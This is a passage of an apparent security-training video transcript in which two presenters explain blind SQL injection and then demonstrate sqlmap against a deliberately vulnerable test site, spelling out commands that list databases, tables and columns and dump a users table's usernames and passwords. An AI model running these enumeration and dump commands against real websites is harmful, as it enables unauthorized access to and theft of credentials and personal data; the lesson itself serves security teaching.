00:22:11.490\nthis is another one of the Blind SQL or\nBlind SQL Injection types.\n\n466\n00:22:11.490 --> 00:22:14.347\nWe can go in and\nwe have valid statements that may,\n\n467\n00:22:14.347 --> 00:22:18.904\nyou'll be manipulated here if you think\nabout the fact that a lot of times we will\n\n468\n00:22:18.904 --> 00:22:23.189\nhave expressions that we are going to\nhave to use in order to send a request or\n\n469\n00:22:23.189 --> 00:22:25.185\nprocess some sort of the command.\n\n470\n00:22:25.185 --> 00:22:28.755\nSo if multiple valid statements\nthat evaluate out to true and\n\n471\n00:22:28.755 --> 00:22:31.940\nfalse are supplied\nthrough the HTTP request.\n\n472\n00:22:31.940 --> 00:22:36.156\nSo that's normal but the problem is we can\nmanipulate that as an attacker knowing\n\n473\n00:22:36.156 --> 00:22:40.062\nthat that's gonna happen and by comparing\nthe response page between these\n\n474\n00:22:40.062 --> 00:22:44.020\nconditions we can infer whether or\nnot the injection was successful.\n\n475\n00:22:44.020 --> 00:22:47.840\nSo this is not about hey,\nare we actually injecting directly?\n\n476\n00:22:47.840 --> 00:22:50.470\nThis is rather,\nwe're on the outside blind, right?\n\n477\n00:22:50.470 --> 00:22:54.060\nWe've executed some other\nkind of SQL injection.\n\n478\n00:22:54.060 --> 00:22:58.710\nWe're now probing, looking for evidence\nwhether or not it actually was successful.\n\n479\n00:22:58.710 --> 00:23:02.470\nWe maybe able to get that by\nusing Boolean exploitation\n\n480\n00:23:02.470 --> 00:23:03.900\nto be able to see evidence of that.\n\n481\n00:23:03.900 --> 00:23:06.880\nSo it's another way we can validate\nessentially that the attack did or\n\n482\n00:23:06.880 --> 00:23:08.720\ndid not take place successfully so.\n\n483\n00:23:08.720 --> 00:23:09.530\nKind of interesting, right.\n\n484\n00:23:09.530 --> 00:23:12.960\nWe can go through and obviously have\na sense of these kind of attacks.\n\n485\n00:23:12.960 --> 00:23:16.500\nLots of different things\nthat can happen here.\n\n486\n00:23:16.500 --> 00:23:23.280\nWe're gonna talk about the, pardon me as\nI choke on my words, we're going to talk\n\n487\n00:23:23.280 --> 00:23:27.590\nabout the ways in which we can see if we\nare vulnerable to SQL injection attacks.\n\n488\n00:23:27.590 --> 00:23:30.775\nI know you put together a nice\nlittle chart for us there.\n\n489\n00:23:30.775 --> 00:23:34.950\nSome different potential code strings\nright that we may actually use and\n\n490\n00:23:34.950 --> 00:23:38.109\nagain just a big disclaimer\nas I say big and you zoom in.\n\n491\n00:23:38.109 --> 00:23:40.177\n&gt;&gt; Did you like that?\n&gt;&gt; Yeah it was good, that was good timing.\n\n492\n00:23:40.177 --> 00:23:43.520\nSo big disclaimers here\nas we often talk about.\n\n493\n00:23:43.520 --> 00:23:47.880\nNo list is definitive, right no list\nis thorough in the sense that this is\n\n494\n00:23:47.880 --> 00:23:51.896\nthe only set of vulnerability codes\nstring that we want to look at.\n\n495\n00:23:51.896 --> 00:23:56.353\nThese are common ones, they are not the\nonly ones, there are many, many out there.\n\n496\n00:23:56.353 --> 00:24:00.049\nBut these are snippets that can be used\nto validate whether a web server May or\n\n497\n00:24:00.049 --> 00:24:02.848\nmay not be vulnerable web apps\nspecifically in a server.\n\n498\n00:24:02.848 --> 00:24:07.500\nMay or not be vulnerable to\na certain kind of injection.\n\n499\n00:24:07.500 --> 00:24:10.120\nAnd so you know the software\nuse some examples right?\n\n500\n00:24:10.120 --> 00:24:13.440\nSome visibility if you will\ninto what this may look like.\n\n501\n00:24:13.440 --> 00:24:16.710\nDo we wanna actually take a look\nmaybe at some live injection?\n\n502\n00:24:16.710 --> 00:24:19.360\n&gt;&gt; Sure.\n&gt;&gt; Wanna do a little show and tell demo.\n\n503\n00:24:19.360 --> 00:24:21.834\n&gt;&gt; Let's do it.\n&gt;&gt; All righty so here I am.\n\n504\n00:24:21.834 --> 00:24:23.420\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm running.\n\n505\n00:24:23.420 --> 00:24:24.610\n&gt;&gt; He's running over so he can show you.\n\n506\n00:24:24.610 --> 00:24:27.480\n&gt;&gt; Go back I was gonna do the whole\nrunning thing I'm running now I'm gonna go\n\n507\n00:24:27.480 --> 00:24:28.930\nrun over to my machine.\n\n508\n00:24:28.930 --> 00:24:29.661\nNow you gotta switch over quickly.\n\n509\n00:24:29.661 --> 00:24:30.350\nLook at that.\n\n510\n00:24:30.350 --> 00:24:31.150\n&gt;&gt; Boom.\n&gt;&gt; And here I am.\n\n511\n00:24:31.150 --> 00:24:31.720\n&gt;&gt; There you are.\n\n512\n00:24:31.720 --> 00:24:33.200\n&gt;&gt; See that\n&gt;&gt; Yeah, we didn't work on that.\n\n513\n00:24:33.200 --> 00:24:34.380\nThat was truly live.\n\n514\n00:24:34.380 --> 00:24:37.092\nWe didn't set that out and\nscript that ahead of time.\n\n515\n00:24:37.092 --> 00:24:39.890\nAll right, so what where gonna\ndo is we're gonna go ahead and\n\n516\n00:24:39.890 --> 00:24:44.560\nwe're gonna actually show some of this for\nreal.\n\n517\n00:24:44.560 --> 00:24:47.630\nI was supposed to show you how do it for\nfake.\n\n518\n00:24:47.630 --> 00:24:52.210\nSo, we're gonna do this for real but\nwe're gonna do and I've given Mike all of\n\n519\n00:24:52.210 --> 00:24:56.060\nthe commands that I'm gonna type in\nyou've got them in a word document.\n\n520\n00:24:56.060 --> 00:24:57.700\nYou'll be able to\nhopefully see them up here.\n\n521\n00:24:57.700 --> 00:24:58.440\nBut he's gonna.\n\n522\n00:24:58.440 --> 00:24:59.090\n&gt;&gt; Show them to us.\n\n523\n00:24:59.090 --> 00:25:00.930\n&gt;&gt; We put in the notes so\nif you need them you have them.\n\n524\n00:25:00.930 --> 00:25:01.660\n&gt;&gt; Yeah we put up so\n\n525\n00:25:01.660 --> 00:25:04.700\nyou can see them cuz I know they kind of\ncut off you can't always see the spaces.\n\n526\n00:25:04.700 --> 00:25:06.520\nIt's kind of a little\nbit hard to tell right.\n\n527\n00:25:06.520 --> 00:25:10.100\nSo, the first thing we’re going to\ndo here is we're gonna go ahead and\n\n528\n00:25:10.100 --> 00:25:12.560\nwe're going to enter this command.\n\n529\n00:25:12.560 --> 00:25:14.590\nWe’re going to use sqlmap -u and\n\n530\n00:25:14.590 --> 00:25:17.840\nthen we’re going to enter the URL\nof the website we want to try.\n\n531\n00:25:17.840 --> 00:25:22.160\nThis is a testphp.vulnweb.com Comma,\nwebsite we're gonna use.\n\n532\n00:25:22.160 --> 00:25:26.190\nWe got a list products.thp string there so\nwe're gonna go in and\n\n533\n00:25:26.190 --> 00:25:29.280\ntry to look at one of\nthe php solutions there.\n\n534\n00:25:29.280 --> 00:25:31.710\nWe're gonna specify there's\na proxy being used so\n\n535\n00:25:31.710 --> 00:25:35.770\nwe have to add in the proxy switch, so\nproxy whatever that is, and now what we're\n\n536\n00:25:35.770 --> 00:25:39.690\ngonna do is try to list the databases\nthat are hosted on this database server.\n\n537\n00:25:39.690 --> 00:25:41.490\nSo we're gonna try to get a list the dash,\n\n538\n00:25:41.490 --> 00:25:46.220\ndash DBS command which is kind of right\nat the very end of the buffer there,\n\n539\n00:25:46.220 --> 00:25:49.100\nis gonna hopefully list the databases for\nus, right?\n\n540\n00:25:49.100 --> 00:25:51.085\nI say hopefully cuz you just never know,\nright?\n\n541\n00:25:51.085 --> 00:25:52.720\n[LAUGH] But it is.\n\n542\n00:25:52.720 --> 00:25:53.270\nWe do know.\n\n543\n00:25:53.270 --> 00:25:55.970\nAnd so we're gonna run this and\nwhat we're gonna do is\n\n544\n00:25:55.970 --> 00:25:59.610\nrun some queries against that\nsystem to figure out what's there.\n\n545\n00:25:59.610 --> 00:26:05.180\nAnd we're actually gonna get a list of two\navailable databases, A-C-U art, so acuart.\n\n546\n00:26:05.180 --> 00:26:09.190\nAnd information under score schema are the\ntwo databases that have been returned but\n\n547\n00:26:09.190 --> 00:26:12.390\nlet's take a look at the beginning of\nthis and just scroll back up here.\n\n548\n00:26:12.390 --> 00:26:15.816\nSo give me just a second to do that\ncause I want you to actually see,\n\n549\n00:26:15.816 --> 00:26:19.490\nwhat has happened here.\n\n550\n00:26:19.490 --> 00:26:23.200\nSo we got that command issued right\nat the top, you can kinda see it and\n\n551\n00:26:23.200 --> 00:26:24.610\nthen it goes out and it says,\n\n552\n00:26:24.610 --> 00:26:28.390\nokay SQL, automatic SQL injection with\ndatabase takeover tool which is SQL map.\n\n553\n00:26:28.390 --> 00:26:31.210\nThat's what we're using,\nwe're using a tool to execute this.\n\n554\n00:26:31.210 --> 00:26:36.400\nSo SQlmap.org would be good just to throw\nup so all the nice people out there,\n\n555\n00:26:36.400 --> 00:26:39.015\nknow how to go out of start\nhacking away people's databases.\n\n556\n00:26:39.015 --> 00:26:41.340\n&gt;&gt; [LAUGH]\n&gt;&gt; And so big legal disclaimer.\n\n557\n00:26:41.340 --> 00:26:44.010\nUse of this tool for\nattacking targets is not allowed.\n\n558\n00:26:44.010 --> 00:26:44.890\nJust want to know that.\n\n559\n00:26:44.890 --> 00:26:48.085\nMake sure you are aware that very\nimportant to think about that.\n\n560\n00:26:48.085 --> 00:26:49.665\nSo we start to tool up, right.\n\n561\n00:26:49.665 --> 00:26:50.357\nGoes out.\n\n562\n00:26:50.357 --> 00:26:54.965\nGoes out and does a bunch of different\nqueries to try to figure out what is and\n\n563\n00:26:54.965 --> 00:26:57.445\nor is not going to be available there.\n\n564\n00:26:57.445 --> 00:27:00.435\nIt does as you can see\na buillion base bind.\n\n565\n00:27:00.435 --> 00:27:04.435\nIt goes out and\nlooks at error base binding.\n\n566\n00:27:04.435 --> 00:27:05.525\nIt does a union query.\n\n567\n00:27:05.525 --> 00:27:07.071\nWe talked about union queries.\n\n568\n00:27:07.071 --> 00:27:10.630\nDoes an and or time base bind and\nthen comes back and\n\n569\n00:27:10.630 --> 00:27:15.090\ntells us hey,\nthe back end DBMS is an MySQL DBMS.\n\n570\n00:27:15.090 --> 00:27:17.060\nWe actually identify the database.\n\n571\n00:27:17.060 --> 00:27:22.400\nTells us it thinks it is running PHP\nversion 5 3.1.0 as a web app technology\n\n572\n00:27:22.400 --> 00:27:25.020\nand it's running my SQLl 5.0 specifically.\n\n573\n00:27:25.020 --> 00:27:29.290\nSo we get some pretty good intel there and\nthen it lists the two databases for us and\n\n574\n00:27:29.290 --> 00:27:34.460\ndumps them so with one command, we've\nessentially now been told what those are.\n\n575\n00:27:34.460 --> 00:27:34.960\n&gt;&gt; Powerful.\n\n576\n00:27:36.000 --> 00:27:37.590\n&gt;&gt; You ain't seen nothing yet, son.\n\n577\n00:27:37.590 --> 00:27:39.180\n&gt;&gt; [LAUGH]\n&gt;&gt; So let's go in there now.\n\n578\n00:27:39.180 --> 00:27:43.810\nYou think that was cool,\njust hang on to your hats, as they say.\n\n579\n00:27:43.810 --> 00:27:45.670\nAll right, so let's go and\nlet's put up another one.\n\n580\n00:27:45.670 --> 00:27:49.790\nSo we're gonna do SQL map again,\nminus u, and what we're gonna do now is\n\n581\n00:27:49.790 --> 00:27:52.940\nwe're gonna try to list the tables that\nare within one of those databases.\n\n582\n00:27:52.940 --> 00:27:56.190\nSo we're gonna go in and\ndump the tables in the AQR database.\n\n583\n00:27:56.190 --> 00:27:56.710\nSo\n&gt;&gt; Now that\n\n584\n00:27:56.710 --> 00:27:58.620\nwe've established that information\n&gt;&gt; There right.\n\n585\n00:27:58.620 --> 00:27:59.214\n&gt;&gt; Yeah.\n&gt;&gt; So we know\n\n586\n00:27:59.214 --> 00:28:01.750\nwe've profiled we know\nthere are two databases.\n\n587\n00:28:01.750 --> 00:28:05.090\nNow we're gonna say okay great I wanna\nknow what's in that database cuz I\n\n588\n00:28:05.090 --> 00:28:06.900\ndon't know acur,\nthat sounds kind of cool right?\n\n589\n00:28:06.900 --> 00:28:07.470\n&gt;&gt; It is yeah.\n\n590\n00:28:07.470 --> 00:28:09.060\n&gt;&gt; Don't know what's in there so\nwe want to find out.\n\n591\n00:28:09.060 --> 00:28:12.470\nSo we're gonna go ahead we're gonna\ntype this in so let's do that.\n\n592\n00:28:12.470 --> 00:28:15.170\nLet's do test php.\n\n593\n00:28:18.345 --> 00:28:22.563\n&gt;&gt; Web.com and then again,\n\n594\n00:28:22.563 --> 00:28:26.589\nlist products dot php and\n\n595\n00:28:26.589 --> 00:28:31.573\nwe are going to dot php question\n\n596\n00:28:31.573 --> 00:28:37.133\nmark cat equals one, spell that,\n\n597\n00:28:37.133 --> 00:28:41.749\nspace, dash, dash, dbs.\n\n598\n00:28:43.390 --> 00:28:46.920\n&gt;&gt; Space -D for the database,\nspecify the database.\n\n599\n00:28:46.920 --> 00:28:51.530\nSo acuart is the database, so we're\ngonna put the name of the database in.\n\n600\n00:28:51.530 --> 00:28:53.960\nSpace --tables, right?\n\n601\n00:28:53.960 --> 00:28:57.410\nSo we're gonna do tables.\n\n602\n00:28:57.410 --> 00:28:58.444\nAnd then --proxy.\n\n603\n00:29:00.260 --> 00:29:05.990\n&gt;&gt; So we have to specify our proxy and\nequal to HTTP and\n\n604\n00:29:05.990 --> 00:29:09.790\nthen proxy colon port numbers 8080.\n\n605\n00:29:09.790 --> 00:29:13.440\nAll right so let's do that and\n\n606\n00:29:13.440 --> 00:29:18.170\nwe're gonna get our list of all of\nthe tables inside of the acuar database.\n\n607\n00:29:18.170 --> 00:29:21.030\nLet's just scroll up here a minute.\n\n608\n00:29:21.030 --> 00:29:25.456\nAgain always good to look at what\nhappens when we execute before we\n\n609\n00:29:25.456 --> 00:29:27.312\nactually look at the data.\n\n610\n00:29:32.032 --> 00:29:32.544\nAll right.\nSo\n\n611\n00:29:32.544 --> 00:29:35.100\none more time we got our command\nup there obviously right.\n\n612\n00:29:35.100 --> 00:29:37.920\nSo it says hey okay, by the again,\nbig disclaimer right.\n\n613\n00:29:37.920 --> 00:29:40.980\nWe know that already so\nwe're just gonna bypass that.\n\n614\n00:29:40.980 --> 00:29:42.230\nWe've already broken the law once,\n\n615\n00:29:42.230 --> 00:29:44.230\nno need to be told the part\nmore than one time right.\n\n616\n00:29:44.230 --> 00:29:47.760\nSo we know that we're now targeting\nthe back end database, right, and\n\n617\n00:29:47.760 --> 00:29:48.830\nwe know it's in a MySQL.\n\n618\n00:29:48.830 --> 00:29:51.645\nWe're gonna run through\nthe various binds and queries.\n\n619\n00:29:51.645 --> 00:29:54.110\nDoes a union query, again, as you can see.\n\n620\n00:29:54.110 --> 00:29:56.140\nAnd this time it profiles the database,\n\n621\n00:29:56.140 --> 00:29:59.030\ntells us what it has tells\nus the database names, but\n\n622\n00:29:59.030 --> 00:30:03.930\nit also scroll down here also tells us\nwhat the tables are for database ACUAR.\n\n623\n00:30:03.930 --> 00:30:08.730\nThere's eight tables,\nit looks like we've got artists carts\n\n624\n00:30:08.730 --> 00:30:12.860\ncat EG I don't know catalog\nmaybe I'm guessing I don't know.\n\n625\n00:30:12.860 --> 00:30:15.540\nFeature, guestbook pictures product users,\n\n626\n00:30:15.540 --> 00:30:18.450\nusers that maybe one that we\nmay wanna think about, right?\n\n627\n00:30:18.450 --> 00:30:20.080\nSo we'd look at some tables and say,\n\n628\n00:30:20.080 --> 00:30:23.440\nokay that's good now if we\nwanna go on a list of columns\n\n629\n00:30:23.440 --> 00:30:27.800\nwithin the table users maybe, find out\nwhat users are on the system, right?\n\n630\n00:30:27.800 --> 00:30:31.170\nBecause I'm thinking artists,\nthat's probably good to know but\n\n631\n00:30:31.170 --> 00:30:33.040\nthe reality is I don't want to,\nlist the artists,\n\n632\n00:30:33.040 --> 00:30:35.920\nI want to list the users in the database\nbecause I want to takeover, right?\n\n633\n00:30:35.920 --> 00:30:38.810\nSo we're gonna do that one now so\nwe're gonna type this in again.\n\n634\n00:30:40.100 --> 00:30:43.708\nSO we're gonna go back yet\n\n635\n00:30:43.708 --> 00:30:49.453\nagain to the well, SQL map minus u right?\n\n636\n00:30:49.453 --> 00:30:53.361\nGonna put in our information so\n\n637\n00:30:53.361 --> 00:30:58.022\nwe'll do Testphp.volweb.com and\n\n638\n00:30:58.022 --> 00:31:03.884\nthen we're gonna do our list Products.php,\n\n639\n00:31:03.884 --> 00:31:10.361\nand we're going to do our ?cat=1 for\ncategory.\n\n640\n00:31:10.361 --> 00:31:13.682\nAnd then -D, D for database.\n\n641\n00:31:13.682 --> 00:31:19.500\nACUART which is our database name and\n\n642\n00:31:19.500 --> 00:31:23.340\nthen minus T for\ntable oops not underscore.\n\n643\n00:31:23.340 --> 00:31:25.480\nMinus capital T for table.\n\n644\n00:31:25.480 --> 00:31:28.150\nCase sensitive by the way I know\nwe've talked about this with other\n\n645\n00:31:28.150 --> 00:31:30.190\ntools right for users right.\n\n646\n00:31:30.190 --> 00:31:34.920\nDash dash column so we're gonna\nspecify we wanna dump the columns.\n\n647\n00:31:34.920 --> 00:31:35.520\nRight.\n\n648\n00:31:35.520 --> 00:31:36.370\nSo we're drilling in.\n\n649\n00:31:36.370 --> 00:31:40.380\nYou can as we find information we\nessentially then incorporate that command.\n\n650\n00:31:40.380 --> 00:31:42.430\nWe don't have to do all\nthe stuff we did to get to that,\n\n651\n00:31:42.430 --> 00:31:44.060\nwe just have to now use\nit with the switch.\n\n652\n00:31:44.060 --> 00:31:45.320\nWe know the database name.\n\n653\n00:31:45.320 --> 00:31:46.670\nWe know the table name.\n\n654\n00:31:46.670 --> 00:31:47.810\nNow we want the columns, right?\n\n655\n00:31:47.810 --> 00:31:50.140\nSo now we're gonna drill down,\nget the columns.\n\n656\n00:31:50.140 --> 00:31:53.957\nAnd then we just gotta do our proxies,\nso let's put our proxy back in there.\n\n657\n00:31:53.957 --> 00:32:00.366\nSo proxy = http://proxy: 8080 I\nthink I made this clear already,\n\n658\n00:32:00.366 --> 00:32:06.671\nbut just so you know before I hit Enter\nhere, if you're not using a proxy,\n\n659\n00:32:06.671 --> 00:32:11.476\nyou leave off the stuff with\nproxy on the end obviously.\n\n660\n00:32:11.476 --> 00:32:14.060\nSee, this is, assume you have\na proxy in the environment.\n\n661\n00:32:14.060 --> 00:32:17.900\nWe're using a proxy in our environment for\nobvious security reasons in the lab and\n\n662\n00:32:17.900 --> 00:32:18.610\nthings like that.\n\n663\n00:32:18.610 --> 00:32:19.730\nSo just be aware of that.\n\n664\n00:32:19.730 --> 00:32:20.790\nLet's hit that one.\n\n665\n00:32:20.790 --> 00:32:24.780\nSo now we're gonna go ahead and we're\ngoing to get the accuart database table\n\n666\n00:32:24.780 --> 00:32:28.980\nusers eight columns in the database,\nor excuse me, in the users table.\n\n667\n00:32:28.980 --> 00:32:33.610\nWe have an addressed column,\nwe have a cart, cc, email, name, pass.\n\n668\n00:32:33.610 --> 00:32:36.970\nThat sounds good, phone,\nand uname for username.\n\n669\n00:32:36.970 --> 00:32:41.950\nSo we've actually dumped all of\nthe stuff in the database there.\n\n670\n00:32:41.950 --> 00:32:45.170\nInside of that database,\nwe've actually dumped all of that.\n\n671\n00:32:45.170 --> 00:32:49.220\nSo now, if we wanna go in and\nactually list the users.\n\n672\n00:32:49.220 --> 00:32:54.416\nLet's go in and list that uname column and\nlet's see what's in there and dump it.\n\n673\n00:32:54.416 --> 00:32:55.496\nRight, so we're gonna do that next.\n\n674\n00:32:55.496 --> 00:32:58.850\nThat will be our next stop on the road.\n\n675\n00:32:58.850 --> 00:33:00.760\nSo, what do you think I'm gonna type?\n\n676\n00:33:00.760 --> 00:33:03.144\n&gt;&gt; I'm gonna say it's gonna\nbe almost all the same thing.\n\n677\n00:33:03.144 --> 00:33:05.561\n&gt;&gt; It's gonna be like identical\nwith one additional thing.\n\n678\n00:33:05.561 --> 00:33:09.643\n&gt;&gt; Single map dash u,\n&gt;&gt; Map dash u, right, so then the URL,\n\n679\n00:33:09.643 --> 00:33:11.670\nso we're gonna do HTTP, right?\n\n680\n00:33:11.670 --> 00:33:20.140\nWe're gonna do test php.vulnweb.com.\n\n681\n00:33:20.140 --> 00:33:21.691\nI'm now in the real world,\nwhat would we do?\n\n682\n00:33:21.691 --> 00:33:23.175\nWe'd probably\n&gt;&gt; Copy and paste.\n\n683\n00:33:23.175 --> 00:33:25.496\n&gt;&gt; Obviously have this copied,\njust paste it in.\n\n684\n00:33:25.496 --> 00:33:28.994\nIn the lab environment, it's a little\ntough to get that working without all\n\n685\n00:33:28.994 --> 00:33:30.590\nthe craziness that comes with it.\n\n686\n00:33:30.590 --> 00:33:33.990\nWe're obviously doing this just so\nnumber one, we can narrate it so\n\n687\n00:33:33.990 --> 00:33:35.310\nwe're gonna talk about it.\n\n688\n00:33:35.310 --> 00:33:37.990\nAlso show you the commands so\nyou can see them on the screen.\n\n689\n00:33:37.990 --> 00:33:41.070\nSo we're taking our time to do it,\nto make it a little bit easier for\n\n690\n00:33:41.070 --> 00:33:43.333\nyou to be able to understand\nit in the real world.\n\n691\n00:33:43.333 --> 00:33:46.660\nI'd have a sample text file with three or\nfour of these filled in with just\n\n692\n00:33:46.660 --> 00:33:49.390\nessentially variables that I'm\ngonna pop in real quick and\n\n693\n00:33:49.390 --> 00:33:52.032\nI'd be dropping them in and\nI'd just be firing them off.\n\n694\n00:33:52.032 --> 00:33:53.340\nI wouldn't be taking this long.\n\n695\n00:33:53.340 --> 00:33:54.475\nSo just understand that, right?\n\n696\n00:33:54.475 --> 00:33:58.221\nNot because I want you to suffer,\nright, while you're typing, but\n\n697\n00:33:58.221 --> 00:34:01.449\nI want you to understand that\nthere is a methodology here and\n\n698\n00:34:01.449 --> 00:34:05.147\nwe want you to understand the proper\nway for this to be taking place.\n\n699\n00:34:05.147 --> 00:34:13.785\nSo, listproducts.php A ?cat=1,\nfor category.\n\n700\n00:34:13.785 --> 00:34:14.319\n&gt;&gt; Then we're gonna do minus.\n\n701\n00:34:14.319 --> 00:34:16.715\n&gt;&gt; We're then gonna do -D, for database.\n\n702\n00:34:16.715 --> 00:34:19.460\nThat's gonna be accuart.\n\n703\n00:34:19.460 --> 00:34:23.920\nWe're then gonna do -T,\ncapital T for users, right, so\n\n704\n00:34:23.920 --> 00:34:26.850\nwe're going to put that in there\nto drill down to the table.\n\n705\n00:34:26.850 --> 00:34:29.423\nWe're then gonna do minus c for column.\n\n706\n00:34:29.423 --> 00:34:30.721\n&gt;&gt; Now we're gonna do column names.\n\n707\n00:34:30.721 --> 00:34:32.380\n&gt;&gt; Now we know that,\nwe're gonna do u name.\n\n708\n00:34:32.380 --> 00:34:35.120\nNow you can imagine we can do passwords or\nanything else.\n\n709\n00:34:35.120 --> 00:34:36.960\nGonna do two dashes there.\n\n710\n00:34:36.960 --> 00:34:39.400\nDump, that's the command\nparameter we want, so\n\n711\n00:34:39.400 --> 00:34:42.725\nwe're gonna tell it dump that to table,\nshow it to us.\n\n712\n00:34:42.725 --> 00:34:46.630\nWe're then gonna put our\nproxy information in there.\n\n713\n00:34:46.630 --> 00:34:51.811\nEqual that to http and then do a proxy and\n\n714\n00:34:51.811 --> 00:34:55.430\na 80, 80, all right.\n\n715\n00:34:57.180 --> 00:35:02.870\nJust gonna do that and then what we\nget is the following here, right?\n\n716\n00:35:02.870 --> 00:35:07.650\nYou'll see that we are able to get,\nlooks like we got one returned entry,\n\n717\n00:35:07.650 --> 00:35:11.550\nretrieved test so it looks like we\nhave one user name called test.\n\n718\n00:35:11.550 --> 00:35:15.550\nAnd so we can see that we do have\na user name or a user in there, right?\n\n719\n00:35:15.550 --> 00:35:16.540\nSo we are able to see that.\n\n720\n00:35:16.540 --> 00:35:19.740\nNow obviously if we had more users,\nwe would get more users back.\n\n721\n00:35:19.740 --> 00:35:21.550\n&gt;&gt; Right,\nit's just a little test database.\n\n722\n00:35:21.550 --> 00:35:22.630\n&gt;&gt; Just us setting this up and\n\n723\n00:35:22.630 --> 00:35:25.140\nobviously just making sure its\ngot some basic stuff in there.\n\n724\n00:35:25.140 --> 00:35:27.650\nIn the real world you'd expect\na little more, but we're not done yet.\n\n725\n00:35:27.650 --> 00:35:30.030\n&gt;&gt; And that's incredibly\npowerful where we are already.\n\n726\n00:35:30.030 --> 00:35:33.540\nI mean you just went in and\nreturned data out of their database,\n\n727\n00:35:33.540 --> 00:35:37.260\nout of a table in their database,\nand sensitive information at that.\n\n728\n00:35:37.260 --> 00:35:38.300\n&gt;&gt; I did.\nNow we gotta do,\n\n729\n00:35:38.300 --> 00:35:39.940\nwe're gonna go one better.\n\n730\n00:35:39.940 --> 00:35:40.440\n&gt;&gt; Uh-oh.\n\n731\n00:35:40.440 --> 00:35:41.804\n&gt;&gt; We're gonna go one better.\n\n732\n00:35:41.804 --> 00:35:44.710\nWe're gonna go one better.\n\n733\n00:35:44.710 --> 00:35:45.210\n&gt;&gt; [LAUGH]\n&gt;&gt; We're gonna go one better.\n\n734\n00:35:45.210 --> 00:35:46.980\n&gt;&gt; Am kinda, there is almost a, is it me,\n\n735\n00:35:46.980 --> 00:35:50.070\nthere seems like a shadow or\nghost that like follows me.\n\n736\n00:35:50.070 --> 00:35:51.430\n&gt;&gt; Yeah so quick.\n\n737\n00:35:51.430 --> 00:35:53.700\nMakes me wanna get\n&gt;&gt; I'm ice-skating.\n\n738\n00:35:53.700 --> 00:35:55.540\n&gt;&gt; Okay, all right.\n\n739\n00:35:55.540 --> 00:35:58.800\n&gt;&gt; Let's go back in here, cuz you don't\nwanna see me skating back and forth.\n\n740\n00:35:58.800 --> 00:36:01.369\nAnd Megan's gonna throttle me as soon\nas I get off camera over here if\n\n741\n00:36:01.369 --> 00:36:02.540\nI keep doing that.\n\n742\n00:36:02.540 --> 00:36:05.030\nAll right, so\nwhat we're gonna do now is one more thing.\n\n743\n00:36:05.030 --> 00:36:06.812\nWe're actually gonna go\nafter the passwords,\n\n744\n00:36:06.812 --> 00:36:08.469\ncuz what are usernames without passwords?\n\n745\n00:36:08.469 --> 00:36:09.120\n&gt;&gt; Useless.\n\n746\n00:36:09.120 --> 00:36:09.670\n&gt;&gt; Absolutely.\n\n747\n00:36:09.670 --> 00:36:10.790\nRight.\n&gt;&gt; Well, we're half the puzzle.\n\n748\n00:36:10.790 --> 00:36:11.830\n&gt;&gt; No, let's go with useless.\n\n749\n00:36:11.830 --> 00:36:12.540\n&gt;&gt; Yeah.\n&gt;&gt; Nah, they're useless.\n\n750\n00:36:12.540 --> 00:36:13.305\nLet's just go with useless.\n\n751\n00:36:13.305 --> 00:36:15.610\n&gt;&gt; [LAUGH]\n&gt;&gt; So we're gonna go in now.\n\n752\n00:36:15.610 --> 00:36:20.250\nSince we know that we have,\nnot just a username column but we did see,\n\n753\n00:36:20.250 --> 00:36:23.460\nif you remember,\nwe had a password one in there, as well.\n\n754\n00:36:23.460 --> 00:36:25.220\nWe're gonna go in, right,\nit was called pass.\n\n755\n00:36:25.220 --> 00:36:28.190\nWe're gonna go in and\njust simply essentially do that and\n\n756\n00:36:28.190 --> 00:36:28.870\nwe're gonna dump it.\n\n757\n00:36:28.870 --> 00:36:33.332\nNow I'm going to make this a little\nbit nicer and easier for you guys.\n\n758\n00:36:33.332 --> 00:36:33.844\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n759\n00:36:33.844 --> 00:36:36.510\n&gt;&gt; I'm not going to make you go\n\n760\n00:36:36.510 --> 00:36:37.950\nthrough this whole thing again.\n\n761\n00:36:37.950 --> 00:36:41.010\nI'm simply gonna go in and\nup arrow, and change that.\n\n762\n00:36:41.010 --> 00:36:44.020\nThat would be cruel and\nunusual punishment, I think.\n\n763\n00:36:44.020 --> 00:36:48.600\nI'm gonna change uname to pass just\nquickly and just type that in, so\n\n764\n00:36:48.600 --> 00:36:50.750\nyou can see it's essentially\nthe same string.\n\n765\n00:36:50.750 --> 00:36:55.410\nAll we're doing is just\nsubstituting the pass table, right?\n\n766\n00:36:55.410 --> 00:36:59.300\nThe column rather inside the table,\ninside the users table.\n\n767\n00:36:59.300 --> 00:37:00.870\nWe're gonna grab the pass column.\n\n768\n00:37:00.870 --> 00:37:05.610\nSo we're gonna do that, hit that,\nlet that go, and what do we see?\n\n769\n00:37:05.610 --> 00:37:06.340\n&gt;&gt; Their password.\n\n770\n00:37:06.340 --> 00:37:09.230\n&gt;&gt; Password there is set to test, right?\n\n771\n00:37:09.230 --> 00:37:12.260\nJust like the user name is set to test,\nso we're actually able to show that\n\n772\n00:37:12.260 --> 00:37:15.210\nwe have both the username and\na password we're able to dump both.\n\n773\n00:37:15.210 --> 00:37:16.660\n&gt;&gt; That is impressive.\n\n774\n00:37:16.660 --> 00:37:18.140\n&gt;&gt; Well thank you sir,\nI do appreciate that.\n\n775\n00:37:18.140 --> 00:37:21.800\nI mean I am, but being told that is\njust reaffirmation of the fact that I am\n\n776\n00:37:21.800 --> 00:37:23.480\nall that and more, as they say.\n\n777\n00:37:23.480 --> 00:37:24.260\nWhat do they say?\n\n778\n00:37:24.260 --> 00:37:25.920\nAll that and a bag of chips,\nthat's what they say.\n\n779\n00:37:25.920 --> 00:37:27.620\n&gt;&gt; That's right, and a bag of chips.\n\n780\n00:37:27.620 --> 00:37:28.540\n&gt;&gt; Right, and a bag of chips.\n\n781\n00:37:28.540 --> 00:37:31.840\nSo this is what we would actually do,\nkinda stepping through the logic,\n\n782\n00:37:31.840 --> 00:37:34.950\nstep by step, of several processes, right?\n\n783\n00:37:34.950 --> 00:37:36.810\nI mean,\nall of this is SQL injection, right?\n\n784\n00:37:36.810 --> 00:37:41.050\nBut what we did is, we went out and we\nidentified a website that was vulnerable.\n\n785\n00:37:41.050 --> 00:37:44.829\nWe did a little recon, we did a little\nfootprinting to figure out exactly what\n\n786\n00:37:46.520 --> 00:37:51.510\nthe potential was there to examine and\nfind out what database was there.\n\n787\n00:37:51.510 --> 00:37:54.380\nWe then started drilling in\nbased on knowing the database,\n\n788\n00:37:54.380 --> 00:37:57.910\nusing the appropriate tools,\nSqlmap and the appropriate 